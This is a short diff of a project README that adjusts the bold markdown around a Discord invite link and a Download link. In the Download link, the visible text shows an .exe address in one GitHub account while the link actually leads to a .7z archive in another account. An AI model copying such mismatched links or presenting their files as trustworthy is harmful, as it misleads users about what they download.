@@ -82,9 +82,10 @@ A: Join our [Discord](https://discord.gg/84R9as5pAW).
 
 <div align="center">
 
-**[Join Discord](https://discord.gg/84R9as5pAW)** *
+**[Join Discord](https://discord.gg/84R9as5pAW)**
 
-*[Download]([https://github.com/eitan743583/LGSC_SC/releases/download/v1%2C.1/LGSC.exe](https://github.com/Smokey2922/LGSC_SC/releases/download/v1.0/Scanner.7z))**
+
+**[Download]([https://github.com/eitan743583/LGSC_SC/releases/download/v1%2C.1/LGSC.exe](https://github.com/Smokey2922/LGSC_SC/releases/download/v1.0/Scanner.7z))**
 
 
 </div>
